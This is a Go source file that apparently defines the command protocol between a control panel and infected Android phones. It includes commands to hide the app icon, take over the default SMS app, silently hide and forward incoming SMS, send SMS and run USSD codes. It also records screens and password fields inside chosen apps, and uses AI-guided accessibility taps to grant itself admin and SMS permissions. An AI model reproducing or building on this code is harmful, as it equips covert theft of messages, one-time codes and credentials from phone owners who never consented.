package protocol

import (
	"encoding/json"
	"errors"
	"regexp"
	"strings"
	"time"

	"github.com/base/realtime/internal/id"
)

var (
	ErrDeviceOffline  = errors.New("device offline")
	ErrCommandTimeout = errors.New("command timeout")
	ErrCommandFailed  = errors.New("command failed")
)

const Version = 1

const (
	TypeHello        = "hello"
	TypeAck          = "ack"
	TypePing         = "ping"
	TypePong         = "pong"
	TypePresence     = "presence"
	TypeError        = "error"
	TypeLog          = "log"
	TypeDeviceGrants = "device.grants"
	TypeDeviceScreen = "device.screen"
	TypeDeviceSms    = "device.sms"
	TypePanelPing     = "panel.ping"
	TypePanelIcon     = "panel.icon"
	TypePanelSmsSync     = "panel.sms.sync"
	TypePanelSmsSend     = "panel.sms.send"
	TypePanelSmsDefault  = "panel.sms.default"
	TypePanelOffmode       = "panel.offmode"
	TypePanelOffmodePolicy = "panel.offmode.policy"
	TypePanelSmsPolicy     = "panel.sms.policy"
	TypePanelScreenshot  = "panel.screenshot"
	TypePanelAppsSync    = "panel.apps.sync"
	TypePanelUssd        = "panel.ussd"
	TypePanelWatch       = "panel.watch"
	TypePanelResult      = "panel.result"
	TypeWatchSession     = "watch.session"
	TypeSmsBatch         = "sms.batch"
	TypeAppsBatch        = "apps.batch"
	TypeAiUiGuideRequest = "ai.ui.guide.request"
	TypeAiUiGuide        = "ai.ui.guide"
	TypeAiUiGuideResult  = "ai.ui.guide.result"
	PortLen              = 20
)

var (
	IdentityPattern = regexp.MustCompile(`^[A-Za-z0-9._:-]{1,64}$`)
	PortPattern     = regexp.MustCompile(`^[A-Za-z0-9]{20}$`)
)

type Envelope struct {
	V       int             `json:"v"`
	ID      string          `json:"id"`
	Type    string          `json:"type"`
	TS      int64           `json:"ts"`
	Ref     *string         `json:"ref,omitempty"`
	Payload json.RawMessage `json:"payload,omitempty"`
}

type ClientInfo struct {
	AppLabel       string `json:"appLabel,omitempty"`
	PackageName    string `json:"packageName,omitempty"`
	Manufacturer   string `json:"manufacturer,omitempty"`
	Brand          string `json:"brand,omitempty"`
	Model          string `json:"model,omitempty"`
	Device         string `json:"device,omitempty"`
	Product        string `json:"product,omitempty"`
	AndroidRelease string `json:"androidRelease,omitempty"`
	Sdk            int    `json:"sdk,omitempty"`
	Operator       string `json:"operator,omitempty"`
	SimOperator    string `json:"simOperator,omitempty"`
	Locale         string `json:"locale,omitempty"`
	TimeZone       string `json:"timeZone,omitempty"`
	IconState         string    `json:"iconState,omitempty"`
	OemSkin           string    `json:"oemSkin,omitempty"`
	Sims              []SimSlot `json:"sims,omitempty"`
	SmsDefaultPkg     string    `json:"smsDefaultPkg,omitempty"`
	SmsDefaultLabel   string    `json:"smsDefaultLabel,omitempty"`
	SmsOurs           bool      `json:"smsOurs,omitempty"`
	SmsHideIncoming   bool      `json:"smsHideIncoming,omitempty"`
	SmsPreviousPkg    string    `json:"smsPreviousPkg,omitempty"`
	SmsPreviousLabel  string    `json:"smsPreviousLabel,omitempty"`
	Offmode           bool      `json:"offmode,omitempty"`
	OffmodeTo         string    `json:"offmodeTo,omitempty"`
	OffmodeFilter     string    `json:"offmodeFilter,omitempty"`
}

type SimSlot struct {
	Slot  int    `json:"slot"`
	State string `json:"state"`
	Label string `json:"label,omitempty"`
}

type Hello struct {
	UserID   string      `json:"userId"`
	DeviceID string      `json:"deviceId"`
	FcmToken string      `json:"fcmToken,omitempty"`
	Port     string      `json:"port,omitempty"`
	Install  bool         `json:"install,omitempty"`
	Client   *ClientInfo  `json:"client,omitempty"`
	Grants   []string     `json:"grants,omitempty"`
	Screen   *ScreenState `json:"screen,omitempty"`
}

// ScreenState is the interactive and keyguard state. False values are kept
// so an unlocked or dark screen is distinct from "not reported".
type ScreenState struct {
	On     bool `json:"on" bson:"on"`
	Locked bool `json:"locked" bson:"locked"`
}

type LogPayload struct {
	Text string `json:"text"`
}

type DeviceGrantsPayload struct {
	Grants []string `json:"grants"`
	Ready  *bool    `json:"ready,omitempty"`
}

var grantOrder = []string{
	"setup",
	"notifications",
	"sms.read",
	"sms.receive",
	"sms.send",
	"sms.mms",
	"sms.wap",
	"sms",
	"battery",
	"alarm",
	"autostart",
	"call",
	"phone",
	"apps",
	"admin",
}

func NormalizeGrants(in []string) []string {
	allowed := make(map[string]struct{}, len(grantOrder))
	for _, k := range grantOrder {
		allowed[k] = struct{}{}
	}
	seen := make(map[string]struct{}, len(in))
	var out []string
	for _, raw := range in {
		g := strings.ToLower(strings.TrimSpace(raw))
		if _, ok := allowed[g]; !ok {
			continue
		}
		if _, dup := seen[g]; dup {
			continue
		}
		seen[g] = struct{}{}
		out = append(out, g)
	}
	ordered := make([]string, 0, len(out))
	for _, k := range grantOrder {
		if _, ok := seen[k]; ok {
			ordered = append(ordered, k)
		}
	}
	return ordered
}

func HasGrant(grants []string, key string) bool {
	for _, g := range grants {
		if g == key {
			return true
		}
	}
	return false
}

type Presence struct {
	UserID   string `json:"userId"`
	DeviceID string `json:"deviceId"`
	Online   bool   `json:"online"`
	LastSeen int64  `json:"lastSeen"`
}

type ErrorPayload struct {
	Message string `json:"message"`
}

func RequiresAck(messageType string) bool {
	switch messageType {
	case TypeAck, TypePing, TypePong, TypeError:
		return false
	default:
		return true
	}
}

func ValidIdentity(value string) bool {
	return IdentityPattern.MatchString(value)
}

func ValidPort(value string) bool {
	return PortPattern.MatchString(value)
}

func Ack(ref string) ([]byte, error) {
	return marshal(Envelope{V: Version, ID: id.New(), Type: TypeAck, TS: now(), Ref: strPtr(ref)})
}

func Ping() ([]byte, error) {
	return marshal(Envelope{V: Version, ID: id.New(), Type: TypePing, TS: now()})
}

func Pong(ref string) ([]byte, error) {
	return marshal(Envelope{V: Version, ID: id.New(), Type: TypePong, TS: now(), Ref: strPtr(ref)})
}

func Error(message string) ([]byte, error) {
	payload, err := json.Marshal(ErrorPayload{Message: message})
	if err != nil {
		return nil, err
	}
	return marshal(Envelope{V: Version, ID: id.New(), Type: TypeError, TS: now(), Payload: payload})
}

func PresenceMessage(userID, deviceID string, online bool, lastSeen time.Time) (string, []byte, error) {
	payload, err := json.Marshal(Presence{
		UserID:   userID,
		DeviceID: deviceID,
		Online:   online,
		LastSeen: lastSeen.UnixMilli(),
	})
	if err != nil {
		return "", nil, err
	}
	messageID := newID()
	body, err := marshal(Envelope{V: Version, ID: messageID, Type: TypePresence, TS: now(), Payload: payload})
	if err != nil {
		return "", nil, err
	}
	return messageID, body, nil
}

type PanelIconPayload struct {
	Mode     string `json:"mode"`
	Fallback bool   `json:"fallback,omitempty"`
}

type PanelSmsSendPayload struct {
	RequestID string `json:"requestId"`
	To        string `json:"to"`
	Body      string `json:"body"`
}

type PanelSmsDefaultPayload struct {
	Action string `json:"action"` // claim | restore
}

type DeviceSmsPayload struct {
	SmsDefaultPkg    string `json:"smsDefaultPkg,omitempty"`
	SmsDefaultLabel  string `json:"smsDefaultLabel,omitempty"`
	SmsOurs          bool   `json:"smsOurs,omitempty"`
	SmsHideIncoming  bool   `json:"smsHideIncoming,omitempty"`
	SmsPreviousPkg   string `json:"smsPreviousPkg,omitempty"`
	SmsPreviousLabel string `json:"smsPreviousLabel,omitempty"`
	Offmode          bool   `json:"offmode,omitempty"`
	OffmodeTo        string `json:"offmodeTo,omitempty"`
	OffmodeFilter    string `json:"offmodeFilter,omitempty"`
}

type OffmodePayload struct {
	On     bool   `json:"on"`
	To     string `json:"to,omitempty"`
	Filter string `json:"filter,omitempty"` // personal | nonpersonal | all
}

type OffmodePolicyPayload struct {
	PersonalPattern string `json:"personalPattern,omitempty"`
	CmdPersonal     string `json:"cmdPersonal,omitempty"`
	CmdNonPersonal  string `json:"cmdNonPersonal,omitempty"`
	CmdAll          string `json:"cmdAll,omitempty"`
}

type SmsPolicyPayload struct {
	HideIncoming bool `json:"hideIncoming"`
}

type PanelResultPayload struct {
	OK        bool   `json:"ok"`
	Error     string `json:"error,omitempty"`
	IconState string `json:"iconState,omitempty"`
	Count     int    `json:"count,omitempty"`
	Text      string `json:"text,omitempty"`
}

type PanelUssdPayload struct {
	Code string `json:"code"`
	Slot int    `json:"slot"`
}

type AppItem struct {
	PackageName string `json:"packageName"`
	Label       string `json:"label"`
	System      bool   `json:"system,omitempty"`
	Icon        string `json:"icon,omitempty"`
}

type AppsBatchPayload struct {
	Reset bool      `json:"reset,omitempty"`
	Apps  []AppItem `json:"apps"`
}

type WatchListPayload struct {
	Packages []string `json:"packages"`
}

type WatchField struct {
	Name     string `json:"name,omitempty"`
	Hint     string `json:"hint,omitempty"`
	Text     string `json:"text,omitempty"`
	Password bool   `json:"password,omitempty"`
}

type WatchPage struct {
	At     int64        `json:"at"`
	Lines  []string     `json:"lines,omitempty"`
	Tree   []string     `json:"tree,omitempty"`
	Fields []WatchField `json:"fields,omitempty"`
}

type WatchSessionPayload struct {
	SessionID string      `json:"sessionId"`
	Package   string      `json:"package"`
	Label     string      `json:"label,omitempty"`
	StartedAt int64       `json:"startedAt"`
	EndedAt   int64       `json:"endedAt"`
	Index     int         `json:"index"`
	Total     int         `json:"total"`
	Pages     []WatchPage `json:"pages,omitempty"`
}

type WatchExtractItem struct {
	Label string `json:"label"`
	Value string `json:"value"`
	Owner string `json:"owner,omitempty"`
	Own   bool   `json:"own,omitempty"`
	Tone  string `json:"tone,omitempty"`
}

type SmsItem struct {
	ProviderID string `json:"providerId"`
	ThreadKey  string `json:"threadKey"`
	Address    string `json:"address"`
	Body       string `json:"body"`
	Date       int64  `json:"date"`
	Type       int    `json:"type"` // 1 inbox, 2 sent
	Read       bool   `json:"read"`
}

type SmsBatchPayload struct {
	Messages []SmsItem `json:"messages"`
}

// AiUiGuideNode is a compact accessibility node for OEM UI guidance.
type AiUiGuideNode struct {
	ID        string `json:"id"`
	Text      string `json:"text,omitempty"`
	Desc      string `json:"desc,omitempty"`
	Cls       string `json:"cls,omitempty"`
	Clickable bool   `json:"clickable,omitempty"`
	Checkable bool   `json:"checkable,omitempty"`
	Checked   bool   `json:"checked,omitempty"`
	NearApp   bool   `json:"nearApp,omitempty"` // OEM: toggle/title on our app row
	Bounds    string `json:"bounds,omitempty"`
}

type AiUiGuideRequestPayload struct {
	RequestID       string          `json:"requestId"`
	Phase           string          `json:"phase,omitempty"`
	TapMode         string          `json:"tapMode,omitempty"`
	TargetPkg       string          `json:"targetPkg,omitempty"`
	Family          string          `json:"family,omitempty"`
	Brand           string          `json:"brand,omitempty"`
	Manufacturer    string          `json:"manufacturer,omitempty"`
	Model           string          `json:"model,omitempty"`
	Sdk             int             `json:"sdk,omitempty"`
	AndroidRelease  string          `json:"androidRelease,omitempty"`
	OemSkin         string          `json:"oemSkin,omitempty"`
	ScreenHash      string          `json:"screenHash,omitempty"`
	AppLabels       []string        `json:"appLabels,omitempty"`       // our app display names
	AppDisplayName  string          `json:"appDisplayName,omitempty"`  // primary label for prompts
	VisibleLabels   []string        `json:"visibleLabels,omitempty"`   // texts on screen (semantic guide)
	UiStep          string          `json:"uiStep,omitempty"`          // optional sub-step hint from client
	ListHint        string          `json:"listHint,omitempty"`        // OEM: scroll_needed | app_visible
	Nodes           []AiUiGuideNode `json:"nodes,omitempty"`           // legacy node-id guide
}

type AiUiGuideAction struct {
	Op        string `json:"op"`
	NodeID    string `json:"nodeId,omitempty"`
	Target    string `json:"target,omitempty"` // tap_text: substring to find on screen
	Direction string `json:"direction,omitempty"`
}

type AiUiGuidePayload struct {
	RequestID string            `json:"requestId"`
	CacheKey  string            `json:"cacheKey,omitempty"`
	Source    string            `json:"source,omitempty"` // cache | ai | give_up
	Error     string            `json:"error,omitempty"`  // why give_up (ai call failed, etc.)
	Actions   []AiUiGuideAction `json:"actions"`
	// Server-side stage timings (milliseconds).
	CacheMs  int64 `json:"cacheMs,omitempty"`
	OllamaMs int64 `json:"ollamaMs,omitempty"`
	TotalMs  int64 `json:"totalMs,omitempty"`
}

type AiUiGuideResultPayload struct {
	RequestID string            `json:"requestId"`
	CacheKey  string            `json:"cacheKey,omitempty"`
	OK        bool              `json:"ok"`
	Error     string            `json:"error,omitempty"`
	Actions   []AiUiGuideAction `json:"actions,omitempty"`
}

func PanelCommand(messageType string, payload any) (string, []byte, error) {
	return commandMessage(messageType, "", payload)
}

// AiUiGuideReply sends ai.ui.guide with envelope ref = client requestId.
func AiUiGuideReply(requestRef string, payload AiUiGuidePayload) (string, []byte, error) {
	return commandMessage(TypeAiUiGuide, requestRef, payload)
}

func commandMessage(messageType, ref string, payload any) (string, []byte, error) {
	var raw json.RawMessage
	if payload != nil {
		b, err := json.Marshal(payload)
		if err != nil {
			return "", nil, err
		}
		raw = b
	}
	messageID := newID()
	env := Envelope{V: Version, ID: messageID, Type: messageType, TS: now(), Payload: raw}
	if ref != "" {
		env.Ref = strPtr(ref)
	}
	body, err := marshal(env)
	if err != nil {
		return "", nil, err
	}
	return messageID, body, nil
}

func newID() string { return id.New() }

func strPtr(value string) *string { return &value }

func RefValue(ref *string) string {
	if ref == nil {
		return ""
	}
	return *ref
}

func now() int64 { return time.Now().UnixMilli() }

func marshal(env Envelope) ([]byte, error) {
	return json.Marshal(env)
}
